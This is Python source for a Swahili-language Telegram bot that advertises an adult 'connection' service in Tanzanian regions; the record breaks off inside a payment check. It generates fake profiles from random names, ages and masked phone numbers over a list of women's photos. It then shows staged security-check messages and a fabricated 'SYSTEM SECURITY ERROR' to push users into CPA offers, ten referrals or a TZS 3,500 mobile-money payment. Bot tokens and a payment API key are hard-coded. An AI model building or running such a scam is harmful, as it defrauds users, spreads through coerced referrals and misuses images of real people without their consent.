import os
import random
import asyncio
import logging
import requests
from datetime import datetime, timedelta
from flask import Flask, request, redirect
from threading import Thread

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, ContextTypes, CommandHandler,
    CallbackQueryHandler, MessageHandler, filters, ConversationHandler
)

from database import (
    init_db, add_user, add_referral, get_referral_count, get_all_users, 
    get_total_users_count, get_seen_images, add_seen_image, reset_seen_images, 
    save_order, update_order_status, get_order_details, is_user_activated,
    log_broadcast_click, get_click_count_for_url
)

# --- TOKENS & CONFIGS ---
MAIN_BOT_TOKEN = "8050903104:AAH0KH4ah-bdLkkNBoW2pMop3FO5-H2DN-4"
ADMIN_BOT_TOKEN = "8900606629:AAFrZXxBockQJSAJ8SqwUid98lNFt3XL4Co"
ADMIN_ID = "8231186202"
CPA_LINK = "https://tinyurl.com/Activebot"
TARGET_SITE = "https://www.tanzaniaraha.com/"
REQUIRED_CHANNEL = "@connectiontzz"
HARAKAPAY_API_KEY = "hpk_29f08857e1613f2df534581540097759168284249880fa85"
HARAKAPAY_BASE_URL = "https://harakapay.net"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

WAITING_PHONE = 1
ADMIN_WAITING_ORDER = 2
ADMIN_WAITING_BROADCAST = 3

# Anti-spam cooldown store
user_cooldowns = {}

async def check_antispam(user_id):
    now = datetime.utcnow()
    last_time = user_cooldowns.get(user_id)
    if last_time and (now - last_time).total_seconds() < 0.8:
        return False
    user_cooldowns[user_id] = now
    return True

# --- CUSTOM REGION LAYOUT ---
REGIONS = [
    "Dar es Salaam", "Arusha", "Mwanza", "Dodoma", "Geita", "Iringa", "Kagera", "Katavi", "Kigoma", 
    "Kilimanjaro", "Lindi", "Manyara", "Mara", "Mbeya", "Morogoro", "Mtwara", "Njombe", "Pwani", 
    "Rukwa", "Ruvuma", "Shinyanga", "Simiyu", "Singida", "Tabora", "Tanga", "Zanzibar"
]

def get_region_keyboard():
    keyboard = []
    idx = 0
    row_pattern = [1, 2, 1, 3, 1, 2, 1, 3, 1, 2, 1, 3, 1, 2, 1, 1]
    for count in row_pattern:
        if idx >= len(REGIONS):
            break
        row = [KeyboardButton(REGIONS[idx+j]) for j in range(min(count, len(REGIONS) - idx))]
        keyboard.append(row)
        idx += count
    while idx < len(REGIONS):
        keyboard.append([KeyboardButton(REGIONS[idx])])
        idx += 1
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

NAMES = [
    "Asha", "Neema", "Amina", "Rehema", "Subira", "Zainabu", "Mariam", "Sophia", "Latifa", "Yasmin",
    "Tatu", "Zuhura", "Janet", "Vero", "Happy", "Joyce", "Stella", "Lilian", "Agnes", "Mwanahamis",
    "Fatma", "Saida", "Zakia", "Fatuma", "Jamila", "Hadija", "Mariamu", "Salma", "Mwanahawa", "Sharifa",
    "Khadija", "Mwanaidi", "Saada", "Zainab", "Mwashamba", "Mwanaisha", "Asia", "Mwamvita", "Mwamini", "Kulthum",
    "Mwatima", "Mwashiuya", "Hafsa", "Halima", "Rukia", "Mtumwa", "Muna", "Mwajuma", "Mwaka", "Siti",
    "Zulekha", "Sakina", "Mwanne", "Mwajabu", "Batuli", "Vanessa", "Sarah", "Irene", "Diana", "Natasha",
    "Linda", "Elizabeth", "Jackline", "Grace", "Naomi", "Brenda", "Judith", "Carol", "Mercy", "Ruth",
    "Catherine", "Joan", "Gloria", "Lucy", "Rose", "Florence", "Winnie", "Veronica", "Angel", "Faith",
    "Hope", "Nancy", "Sylvia", "Belinda", "Miriam", "Dorcas", "Queen", "Precious", "Rebecca", "Deborah",
    "Tina", "Aida", "Flora", "Anita", "Rashida", "Zuleha", "Magreth", "Zaina", "Glory", "Aisha",
    "Rahma", "Nuru", "Zawadi", "Imani", "Pendo", "Tumaini", "Samira", "Shamim", "Najma", "Nadia",
    "Hawa", "Asma", "Aziza", "Husna", "Inaya", "Iqra", "Jannat", "Khadra", "Laila", "Leila",
    "Marwa", "Munira", "Nabila", "Nafisa", "Nasra", "Ruqayya", "Safia", "Safa", "Samia", "Sanaa",
    "Shakira", "Shukria", "Sumaya", "Tahira", "Tamima", "Tasneem", "Uzuri", "Warda", "Yumna", "Zahara",
    "Zahra", "Zamzam", "Zarina", "Adela", "Adriana", "Alexandra", "Alice", "Amanda", "Amelia", "Amy",
    "Andrea", "Angela", "Anna", "Anne", "Ariana", "Ashley", "Audrey", "Barbara", "Bianca", "Brianna",
    "Camila", "Chantal", "Charlotte", "Cheryl", "Christina", "Claire", "Clara", "Claudia", "Danielle", "Darlene",
    "Delia", "Eleanor", "Elena", "Ella", "Emily", "Emma", "Erica", "Esther", "Eva", "Evelyn",
    "Fiona", "Gabriella", "Gemma", "Georgia", "Gillian", "Hannah", "Harriet", "Isabella", "Isabelle", "Jasmine",
    "Jennifer", "Jessica", "Jillian", "Josephine", "Julia", "Juliana", "Karen", "Kayla", "Kelly", "Kimberly",
    "Kristina", "Laura", "Lauren", "Leah", "Leslie", "Lydia", "Madeline", "Madison", "Maria", "Marina",
    "Marissa", "Martha", "Melissa", "Michelle", "Monica", "Morgan", "Natalie", "Nicole", "Olivia", "Pamela",
    "Patricia", "Paula", "Rachel", "Rachael", "Rosemary", "Samantha", "Sandra", "Savannah", "Sharon", "Sheila",
    "Sonia", "Stephanie", "Susan", "Suzanne", "Tamara", "Teresa", "Theresa", "Tracy", "Valerie", "Victoria",
    "Virginia", "Vivian", "Whitney", "Yvonne", "Zoe", "Abigail", "Adeline", "Alicia", "Alisha", "Alma",
    "Amber", "Anastasia", "Annette", "April", "Aubrey", "Beatrice", "Beth", "Bethany", "Beverly", "Bonnie",
    "Candice", "Caroline", "Cassie", "Cecilia", "Celeste", "Cynthia", "Daisy", "Dakota", "Daphne", "Destiny",
    "Elisa", "Elise", "Eliza", "Elsie", "Emilia", "Esme", "Eunice", "Felicia", "Gabrielle", "Giselle",
    "Hailey", "Heidi", "Helen", "Isabel", "Jade", "Jamie", "Janelle", "Janice", "Jenna", "Jenny",
    "Jocelyn", "Jordan", "Kaitlyn", "Katherine", "Kathleen", "Kendra", "Kiara", "Kylie", "Lara", "Lexi",
    "Lola", "Lorraine", "Lucia", "Lucille", "Maggie", "Margaret", "Mariah", "Marilyn", "Maya", "Megan",
    "Melanie", "Molly", "Monique", "Myra", "Nadine", "Natalia", "Nathalie", "Nina", "Noelle", "Olive",
    "Ophelia", "Paris", "Penelope", "Phoebe", "Priscilla", "Renee", "Rita", "Ruby", "Sabrina", "Sadie",
    "Selena", "Serena", "Shanice", "Shannon", "Skylar", "Sophie", "Stacy", "Summer", "Sydney", "Tanya",
    "Tara", "Tasha", "Taylor", "Tiffany", "Toni", "Valentina", "Violet", "Vivienne", "Wendy", "Willow",
    "Ximena", "Yvette", "Zelda", "Alina", "Amara", "Amani", "Anaya", "Ariel", "Athena", "Bella",
    "Brielle", "Carmen", "Celina", "Dalia", "Eliana", "Jada", "Jalia", "Jemima", "Jovina", "Kadija",
    "Kibibi", "Koku", "Maimuna", "Malkia", "Maryam", "Maua", "Mboni", "Mchome", "Mgeni", "Minah",
    "Mishka", "Mubarak", "Munawwar", "Mwana", "Mwanajuma", "Mwanamisi", "Mwanashujaa", "Mwanatatu", "Mwanahamisi", "Mwanasiti",
    "Mwanawema", "Najat", "Nawal", "Nazia", "Pendo", "Riziki", "Sabina", "Sada", "Sadaka", "Safina",
    "Safiya", "Salima", "Sausan", "Shanaz", "Shani", "Shukri", "Sumaiya", "Tabitha", "Talia", "Tausi",
    "Tunu", "Ummi", "Wema", "Widad", "Yasmeen", "Yasmina", "Zawiya", "Zuleika", "Zubeda"
]

IMAGES = [
    "https://i.postimg.cc/vm1M8nbg/1791854037257.jpg", "https://i.postimg.cc/fynkD7PG/1791906305237.jpg",
    "https://i.postimg.cc/G2s9WgXM/1791906329014.jpg", "https://i.postimg.cc/50FjhKs8/1791906348662.jpg",
    "https://i.postimg.cc/LsWn0F3Z/1791906353383.jpg", "https://i.postimg.cc/BvzXwfBn/1791906371572.jpg",
    "https://i.postimg.cc/bv5sFf9p/1791906389122.jpg", "https://i.postimg.cc/hGYf3Rb6/1791906398043.jpg",
    "https://i.postimg.cc/FKzYZHcn/1791906408155.jpg", "https://i.postimg.cc/qvjty3tQ/1791906420123.jpg",
    "https://i.postimg.cc/VkDSnCSC/1791906435675.jpg", "https://i.postimg.cc/MpdcVQcG/1791906509109.jpg",
    "https://i.postimg.cc/pL2hmZdH/1791906519102.jpg", "https://i.postimg.cc/kgn62cgZ/1791906531737.jpg",
    "https://i.postimg.cc/jd6nq9tp/1791906554920.jpg", "https://i.postimg.cc/Prn8jhs1/1791906567161.jpg",
    "https://i.postimg.cc/SNLYQ5kz/1791906700847.jpg", "https://i.postimg.cc/VsCbpvTY/1791907006897.jpg",
    "https://i.postimg.cc/KjBkMpLF/1791907063155.jpg", "https://i.postimg.cc/W41kHnRm/1791907077162.jpg",
    "https://i.postimg.cc/pdcFbFRm/1791907110977.jpg", "https://i.postimg.cc/qv0n8r1r/1791907157738.jpg",
    "https://i.postimg.cc/7PGg4mCq/1791907177809.jpg", "https://i.postimg.cc/TYngL1qg/1791907187355.jpg",
    "https://i.postimg.cc/nrD71h8s/1791907232480.jpg", "https://i.postimg.cc/BvmxSz5g/1791907255159.jpg",
    "https://i.postimg.cc/RCyLJ2ky/1791907265005.jpg", "https://i.postimg.cc/zD6FH9mY/1791907420672.jpg",
    "https://i.postimg.cc/k4ZSHKwX/1791907434486.jpg", "https://i.postimg.cc/xCqHgtvw/1791907438118.jpg",
    "https://i.postimg.cc/zfxKn9gn/1791907596816.jpg", "https://i.postimg.cc/DwdqzWyF/1791907641145.jpg",
    "https://i.postimg.cc/xTmvWxwz/1791910862948.jpg", "https://i.postimg.cc/gkhVfSCY/1791910868033.jpg",
    "https://i.postimg.cc/pT1QtgVr/1791910912470.jpg", "https://i.postimg.cc/T1zrKgD1/1791910946659.jpg",
    "https://i.postimg.cc/wvB5Z6pn/1791910964051.jpg", "https://i.postimg.cc/KjpJY1Z3/1791853362972.jpg",
    "https://i.postimg.cc/QCdfsQrD/1791853387431.jpg", "https://i.postimg.cc/VNXGFsRm/1791853420218.jpg",
    "https://i.postimg.cc/RF9PprsG/1791853437567.jpg", "https://i.postimg.cc/6QCjh6hg/1791853443814.jpg",
    "https://i.postimg.cc/RZkpfJc5/1791853514748.jpg", "https://i.postimg.cc/wTbGqGvZ/1791853572314.jpg",
    "https://i.postimg.cc/L60b9bXQ/1791853590912.jpg", "https://i.postimg.cc/XNLPhJ0G/1791853597063.jpg",
    "https://i.postimg.cc/8k4Y35VN/1791853626887.jpg", "https://i.postimg.cc/zvxPRdkK/1791853632479.jpg",
    "https://i.postimg.cc/vBLKG8gJ/1791853652329.jpg", "https://i.postimg.cc/ydz5q3dZ/1791853657412.jpg",
    "https://i.postimg.cc/7LzcQnqs/1791853668145.jpg", "https://i.postimg.cc/DwHHgM31/1791853710537.jpg",
    "https://i.postimg.cc/nhCNqtgZ/1791853718953.jpg", "https://i.postimg.cc/28js8Wxn/1791853736371.jpg",
    "https://i.postimg.cc/5NPZHt7W/1791853769688.jpg", "https://i.postimg.cc/sDfkDWJ7/1791853788828.jpg",
    "https://i.postimg.cc/Y2xcHRYs/1791853824076.jpg", "https://i.postimg.cc/vBFRQSPZ/1791853832194.jpg",
    "https://i.postimg.cc/C1TyF6vZ/1791853857553.jpg", "https://i.postimg.cc/QMWGZrJc/1791853862653.jpg",
    "https://i.postimg.cc/1zNh1Zrw/1791853873837.jpg", "https://i.postimg.cc/W4QVd44s/1791853893484.jpg",
    "https://i.postimg.cc/43rGY3xS/1791853899906.jpg", "https://i.postimg.cc/jjWKqft4/1791853912049.jpg",
    "https://i.postimg.cc/Gmgd1KwL/1791853917098.jpg", "https://i.postimg.cc/Bv8sZF4T/1791853946091.jpg",
    "https://i.postimg.cc/JzzMggFd/1791854075161.jpg", "https://i.postimg.cc/ZKZTP0xb/1791854086618.jpg",
    "https://i.postimg.cc/YSX4ZY8R/malay-atz-20261013-0001.webp", "https://i.postimg.cc/q7pMkqgW/nicklamaar-20261013-0001.jpg",
    "https://i.postimg.cc/bvLYdPtZ/tanzania-baddies-20261013-0001.webp", "https://i.postimg.cc/mrVZh4H4/tanzania-baddies-20261013-0002.webp",
    "https://i.postimg.cc/ZqjY0mdT/tanzania-baddies-20261013-0003.webp", "https://i.postimg.cc/Xv2Zmdxk/tanzanian-girls-20261013-0001.webp",
    "https://i.postimg.cc/5tPHTLpm/tanzanian-girls-20261013-0002.webp", "https://i.postimg.cc/VN7Spn4R/tanzanian-girls-20261013-0003.webp",
    "https://i.postimg.cc/tgRZB2dX/tanzanian-girls-20261013-0004.webp", "https://i.postimg.cc/HLWc6B0D/tanzanian-girls-20261013-0005.webp", 
"https://i.postimg.cc/LsMWfLDR/tanzanian-girls-20261114-0011.webp",
    "https://i.postimg.cc/MpB4vd7p/tanzanian-girls-20261114-0012.webp",
    "https://i.postimg.cc/YCFVhb62/tanzanian-girls-20261114-0013.webp",
    "https://i.postimg.cc/7Zzcfm3r/tanzanian-girls-20261114-0014.webp",
    "https://i.postimg.cc/y8R5kvmz/tanzanian-girls-20261114-0015.webp",
    "https://i.postimg.cc/vZnjc3WC/tanzanian-girls-20261114-0016.webp",
    "https://i.postimg.cc/3xG6dngq/tanzanian-girls-20261114-0017.webp",
    "https://i.postimg.cc/HkMKVBQP/tanzanian-girls-20261114-0018.webp",
    "https://i.postimg.cc/dVCXL48W/tanzanian-girls-20261114-0019.webp",
    "https://i.postimg.cc/9Q9SrJG8/tanzanian-girls-20261114-0020.webp",
    "https://i.postimg.cc/YCFVhb1x/tanzanian-girls-20261114-0021.webp",
    "https://i.postimg.cc/65ggWDGY/tanzanian-girls-20261114-0022.webp",
    "https://i.postimg.cc/gkQQzf6s/tanzanian-girls-20261114-0023.webp",
    "https://i.postimg.cc/sgW8vwp4/tanzanian-girls-20261114-0024.webp",
    "https://i.postimg.cc/yYtt1wSP/tanzanian-girls-20261114-0025.webp",
    "https://i.postimg.cc/NfSSsWr7/tanzanian-girls-20261114-0026.webp",
    "https://i.postimg.cc/kXzzJktN/tanzanian-girls-20261114-0027.webp",
    "https://i.postimg.cc/rF33Vvt5/tanzanian-girls-20261114-0028.webp",
    "https://i.postimg.cc/pX44Wgnz/tanzanian-girls-20261114-0029.webp",
    "https://i.postimg.cc/hP66DH7z/tanzanian-girls-20261114-0030.webp",
    "https://i.postimg.cc/9FKKmvq4/tanzanian-girls-20261114-0031.webp",
    "https://i.postimg.cc/qMzWdkg6/tanzanian-girls-20261114-0032.webp",
    "https://i.postimg.cc/fTppz60y/tanzanian-girls-20261114-0033.webp",
    "https://i.postimg.cc/zXV41J3J/tanzanian-girls-20261114-0034.webp",
    "https://i.postimg.cc/ncCNtHMF/tanzanian-girls-20261114-0035.webp",
    "https://i.postimg.cc/m2tKGbk0/tanzanian-girls-20261114-0036.webp",
    "https://i.postimg.cc/MKvg8WHg/tanzanian-girls-20261114-0037.webp",
    "https://i.postimg.cc/59PDGH4T/tanzanian-girls-20261114-0038.webp",
    "https://i.postimg.cc/ZYfXg9bg/tanzanian-girls-20261114-0039.webp",
    "https://i.postimg.cc/dQWgX7sS/tanzanian-girls-20261114-0040.webp",
    "https://i.postimg.cc/FFPwqfrC/tanzanian-girls-20261114-0041.webp",
    "https://i.postimg.cc/BZhRy8SC/tanzanian-girls-20261114-0042.webp",
    "https://i.postimg.cc/jq8B9Wxy/tanzanian-girls-20261114-0043.webp",
    "https://i.postimg.cc/6q1SGPby/tanzanian-girls-20261114-0044.webp",
    "https://i.postimg.cc/nrw5QWSn/tanzanian-girls-20261114-0045.webp",
    "https://i.postimg.cc/T1HSWsNw/tanzanian-girls-20261114-0046.webp",
    "https://i.postimg.cc/Y0yVmPDk/tanzanian-girls-20261114-0047.webp",
    "https://i.postimg.cc/sx08ZLHs/tanzanian-girls-20261114-0048.webp",
    "https://i.postimg.cc/mk6qFnX5/tanzanian-girls-20261114-0049.webp",
    "https://i.postimg.cc/zvPMRQt4/tanzanian-girls-20261114-0050.webp",
    "https://i.postimg.cc/PJq9JH4B/tanzanian-girls-20261114-0051.webp",
    "https://i.postimg.cc/XqvmqW8t/tanzanian-girls-20261114-0052.webp",
    "https://i.postimg.cc/Bbvkb3gV/tanzanian-girls-20261114-0053.webp",
    "https://i.postimg.cc/wMBZMzVP/tanzanian-girls-20261114-0054.webp",
    "https://i.postimg.cc/wMBZMzV4/tanzanian-girls-20261114-0055.webp",
    "https://i.postimg.cc/sx2qxzcw/tanzanian-girls-20261114-0056.webp",
    "https://i.postimg.cc/D0zH0hgQ/tanzanian-girls-20261114-0057.webp",
    "https://i.postimg.cc/FRpwhzjj/tanzanian-girls-20261114-0058.webp",
    "https://i.postimg.cc/2y5MyYw1/tanzanian-girls-20261114-0059.webp",
    "https://i.postimg.cc/pTC3PrD5/tanzanian-girls-20261114-0060.webp",
    "https://i.postimg.cc/nz2Nnrvj/tanzanian-girls-20261114-0061.webp",
    "https://i.postimg.cc/tTk89JhT/tanzanian-girls-20261114-0062.webp",
    "https://i.postimg.cc/j5cBR2z2/tanzanian-girls-20261114-0063.webp",
    "https://i.postimg.cc/ZRHXJnr5/tanzanian-girls-20261114-0064.webp",
    "https://i.postimg.cc/G2K6btkh/tanzanian-girls-20261114-0065.webp",
    "https://i.postimg.cc/9Mbsc0GV/tanzanian-girls-20261114-0066.webp",
    "https://i.postimg.cc/C179w5jg/tanzanian-girls-20261114-0067.webp",
    "https://i.postimg.cc/V6g2zvjz/tanzanian-girls-20261114-0068.webp",
    "https://i.postimg.cc/xC5B98Kr/tanzanian-girls-20261114-0069.webp",
    "https://i.postimg.cc/sXstF7ZC/tanzanian-girls-20261114-0070.webp",
    "https://i.postimg.cc/xCnWrMbf/tanzanian-girls-20261114-0071.webp",
    "https://i.postimg.cc/gJmf986m/tanzanian-girls-20261114-0072.webp",
    "https://i.postimg.cc/d1wzMrTK/tanzanian-girls-20261114-0073.webp",
    "https://i.postimg.cc/1tsLxwVj/tanzanian-girls-20261114-0074.webp"
]

def get_verified_success_text():
    return (
        "🎉 <b>AKAUNTI YAKO IMEWEZESHWA KIKAMILIFU!</b> ✅\n\n"
        "Hongera! Uthibitisho wako umekubaliwa kwenye mfumo na sasa una ufikiaji kamili wa huduma zote za VIP na machapisho ya kipekee. 💃🔥\n\n"
        "🔗 <b>TOVUTI KUU YA CONNECTION:</b>\n"
        "👉 <a href=\"https://www.tanzaniaraha.com/\">Fungua Tanzania Raha</a>\n\n"
        "📢 <b>VIKOSI NA CHANNELS RASMI ZA VIP:</b>\n"
        "🔗 <a href=\"https://t.me/rawexotichub\">Raw Exotic Hub</a>\n"
        "🔗 <a href=\"https://t.me/hadithizamapenzi\">Hadithi za Mapenzi</a>\n"
        "🔗 <a href=\"https://t.me/hunterjay12345\">Hunter Jay Channel</a>\n"
        "🔗 <a href=\"https://t.me/+4Zp-ZGleL1tlZmU0\">VIP Group 1</a>\n"
        "🔗 <a href=\"https://t.me/+t5wPETWeNGk1NDlk\">VIP Group 2</a>\n"
        "🔗 <a href=\"https://t.me/+nLWCZ_D1zN8zNzg8\">VIP Group 3</a>\n"
        "🔗 <a href=\"https://t.me/+Mn-pvG_YXqQzNTQ0\">VIP Group 4</a>\n"
        "🔗 <a href=\"https://t.me/+xzbacOOTVwkxNjZk\">VIP Group 5</a>\n"
        "🔗 <a href=\"https://t.me/+QeTJSEa1s2xmZTJk\">VIP Group 6</a>\n"
        "🔗 <a href=\"https://t.me/joinchat/AAAAAEzFd9XDWqbcyqXiOg\">Archive & Vault</a>\n\n"
        "👇 <i>Chagua huduma unayotaka hapa chini au rudi kwenye mikoa:</i>"
    )

async def check_membership(bot, user_id):
    try:
        member = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=int(user_id))
        if member.status in ["member", "administrator", "creator"]:
            return True
    except Exception:
        pass
    return False

# --- MAIN BOT HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    add_user(user_id, user.username, user.first_name, str(datetime.utcnow()))

    if context.args:
        ref_id = context.args[0]
        if add_referral(ref_id, user_id):
            try:
                await context.bot.send_message(
                    chat_id=int(ref_id),
                    text="🎉 <b>Taarifa ya Mwaliko!</b>\n\n🔗 Mtu mpya amejiunga kupitia link yako ya mwaliko! Endelea kusambaza upate upendeleo zaidi.",
                    parse_mode="HTML"
                )
            except Exception:
                pass

    await update.message.reply_text(
        "🔞 <b>SYSTEM AGE VERIFICATION</b>\n\n"
        "Huduma hii ni maalum kwa ajili ya watu wazima pekee (18+). Tafadhali thibitisha umri wako kuendelea.\n\n"
        "👇 <b>Chagua hapa chini:</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ NDIO, NINA 18+", callback_data="age_yes"),
             InlineKeyboardButton("❌ HAPANA", callback_data="age_no")]
        ])
    )

async def age_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "age_no":
        await query.message.edit_text("❌ Samahani, huwezi kutumia bot hii ikiwa una chini ya miaka 18.")
        return

    is_joined = await check_membership(context.bot, query.from_user.id)
    if not is_joined:
        await query.message.edit_text(
            f"📢 <b>LAZIMA UJIUNGE NA CHANNEL YETU KWANZA!</b>\n\n"
            f"Ili kuendelea kutumia bot hii, tafadhali jiunge na channel yetu rasmi hapa chini:\n\n"
            f"👉 <a href=\"https://t.me/connectiontzz\">Jiunge na Connection TZZ</a>\n\n"
            f"Baada ya kujiunga, bonyeza kitufe cha 'Kagua Uanachama' hapa chini:",
            parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 JIUNGE NA CHANNEL", url="https://t.me/connectiontzz")],
                [InlineKeyboardButton("✅ NIMESHAJIUNGE, ENDELEA", callback_data="check_sub")]
            ])
        )
        return

    await proceed_to_regions(query.message)

async def check_sub_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    is_joined = await check_membership(context.bot, user_id)
    if not is_joined:
        await query.answer("⚠️ Bado hujajiunga na channel! Tafadhali jiunge kwanza.", show_alert=True)
        return
    await query.answer("✅ Uanachama umethibitishwa!", show_alert=False)
    try:
        await query.message.delete()
    except Exception:
        pass
    await proceed_to_regions(query.message)

async def proceed_to_regions(message):
    welcome_text = (
        f"🍑 Karibu kwenye <b>Tanzania Connection Bot</b> 🔞🇹🇿\n\n"
        "📍 Chagua mkoa wako hapa chini uanze kutafuta Masugar Mummy, Pisi kali, Watoto wa chuo, na Mashangazi sasa hivi! 💃🔥\n"
        "🆓 Huduma ni <b>BURE 100%</b> masaa 24/7!\n\n"
        "👇 <b>Chagua mkoa unaotaka kutoka kwenye orodha hapa chini</b> 👇"
    )
    await message.reply_text(welcome_text, parse_mode="HTML", reply_markup=get_region_keyboard())

async def region_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await check_antispam(str(user_id)):
        return

    region = update.message.text.strip()
    if region not in REGIONS:
        return

    hide_kb = await update.message.reply_text("<i>🔄 Inapakia taarifa za eneo lako...</i>", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
    await asyncio.sleep(0.6)
    await hide_kb.delete()

    seen = get_seen_images(str(user_id))
    available_images = [img for img in IMAGES if img not in seen]
    if not available_images:
        reset_seen_images(str(user_id))
        available_images = IMAGES

    image_url = random.choice(available_images)
    add_seen_image(str(user_id), image_url)

    name = random.choice(NAMES)
    age = random.randint(18, 25)
    prefix = random.choice(["07", "06"])
    number = f"<tg-spoiler>{prefix}{random.randint(10,99)}•••{random.randint(10,99)}</tg-spoiler>"

    caption = (
        f"🔥 <b>MPYA NDANI YA {region.upper()}</b> 🔥\n\n"
        f"💋 <b>JINA:</b> {name}\n"
        f"🎂 <b>UMRI:</b> {age} Years\n"
        f"📍 <b>ENEO:</b> {region}\n"
        f"📞 <b>NAMBA YA SIMU:</b> {number}\n"
        f"💎 <b>AINA:</b> Verified Connection\n\n"
        "👇 <b>Bonyeza kitufe hapa chini kuunganishwa nae mara moja</b> 👇"
    )

    sent_msg = await update.message.reply_photo(
        photo=image_url,
        caption=caption,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 KUONGANISHWA NAE", callback_data="get_connection")],
            [InlineKeyboardButton("🔙 RUDI KWENYE MKOA", callback_data="back_to_regions")]
        ])
    )
    context.user_data.setdefault('tracked_msgs', []).append((sent_msg.message_id, datetime.utcnow()))

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    if not await check_antispam(user_id):
        await query.answer("⚠️ Unabonyeza haraka sana! Subiri kidogo.", show_alert=True)
        return

    await query.answer()

    if query.data == "check_sub":
        is_joined = await check_membership(context.bot, query.from_user.id)
        if not is_joined:
            await query.answer("⚠️ Bado hujajiunga na channel! Tafadhali jiunge kwanza.", show_alert=True)
            return
        try:
            await query.message.delete()
        except Exception:
            pass
        await proceed_to_regions(query.message)
        return

    if query.data == "get_connection":
        if is_user_activated(user_id):
            await query.message.reply_text(
                get_verified_success_text(),
                parse_mode="HTML",
                disable_web_page_preview=True,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🟢 FUNGUA TOVUTI YA CONNECTION", url=TARGET_SITE)],
                    [InlineKeyboardButton("🔙 RUDI KWENYE MKOA", callback_data="back_to_regions")]
                ])
            )
            return

        msg = await query.message.reply_text("<i>🔍 Kuchunguza seva za usalama...</i>", parse_mode="HTML")
        await asyncio.sleep(0.6)
        msg = await msg.edit_text("<i>🔄 Inatafuta data za mtumiaji...</i>", parse_mode="HTML")
        await asyncio.sleep(0.6)
        msg = await msg.edit_text("<i>🔐 Inapitia mfumo wa uthibitisho...</i>", parse_mode="HTML")
        await asyncio.sleep(0.6)
        msg = await msg.edit_text("<i>⚠️ Firewall imezuia upatikanaji wa namba...</i>", parse_mode="HTML")
        await asyncio.sleep(0.6)
        await msg.delete()

        await query.message.reply_text(
            "🛑 <b>SYSTEM SECURITY ERROR [ERR_AUTH_403]</b> 🛑\n\n"
            "Uunganishwaji umesitishwa kwa muda. Ili kulinda faragha ya mhusika, unahitaji kukamilisha uthibitisho wa mfumo kupitia mojawapo ya njia hapa chini 👇",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ ACTIVATION 1", callback_data="activation1"),
                    InlineKeyboardButton("✅ ACTIVATION 2", callback_data="activation2")
                ],
                [InlineKeyboardButton("✅ ACTIVATION 3", callback_data="activation3")],
                [InlineKeyboardButton("🔙 RUDI", callback_data="back")]
            ])
        )
    elif query.data == "activation1":
        await query.message.edit_text(
            "🔐 <b>MAELEZO YA ACTIVATION [1]</b>\n\n"
            "Tafadhali fuata maelezo na maagizo yote yaliyopo kwenye mfumo wetu ili kukamilisha hatua hii kwa usahihi. 🎯",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📥 FUNGUA TOVUTI", url=CPA_LINK)],
                [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
            ])
        )
    elif query.data == "activation2":
        ref_count = get_referral_count(user_id)
        await query.message.edit_text(
            f"👥 <b>JINSI YA KUFANYA VERIFICATION [2]</b>\n\n"
            f"🔗 <b>Link yako ya Mwaliko:</b>\n<code>https://t.me/connectiontzzbot?start={user_id}</code>\n\n"
            f"⏳ <b>Waliojiunga kupitia wewe:</b> <code>{ref_count}/10</code>\n\n"
            "📢 Sambaza link hii kwenye magroup au kwa marafiki zako ili kujifungua bure!",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 CHEKI IDADI", callback_data="check_refs")],
                [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
            ])
        )
    elif query.data == "check_refs":
        ref_count = get_referral_count(user_id)
        if ref_count < 10:
            await query.answer(
                f"🚫 BADO HUJATIMIZA REFERRAL 10.\n👥 Waliojiunga: {ref_count}/10",
                show_alert=True
            )
        else:
            await query.message.reply_text(
                get_verified_success_text(),
                parse_mode="HTML",
                disable_web_page_preview=True,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🟢 FUNGUA TOVUTI YA CONNECTION", url=TARGET_SITE)],
                    [InlineKeyboardButton("🔙 RUDI KWENYE MKOA", callback_data="back_to_regions")]
                ])
            )
    elif query.data == "activation3":
        await query.message.edit_text(
            "💳 <b>ACTIVATION YA HARAKA - TZS 3,500</b>\n\n"
            "Tafadhali weka namba yako ya simu ya mtandao (M-Pesa, TigoPesa, AirtelMoney) ili mfumo ukututumie ombi la malipo moja kwa moja (USSD Push).\n\n"
            "Andika namba yako hapa chini (mfano: 0712345678):",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
            ])
        )
        return WAITING_PHONE
    elif query.data.startswith("check_pay_"):
        order_id = query.data.split("_")[2]
        status_msg = await query.message.reply_text("<i>🔄 Inakagua hali ya malipo kupitia HarakaPay...</i>", parse_mode="HTML")
        try:
            res = requests.get(
                f"{HARAKAPAY_BASE_URL}/api/v1/status/{order_id}",
                headers={"X-API-Key": HARAKAPAY_API_KEY},
                timeout=15
            ).json()
            
            if res.get("success"):
                payment_info = res.get("payment", {})
                status = payment_info.get("status", "pending")
                if status == "completed":
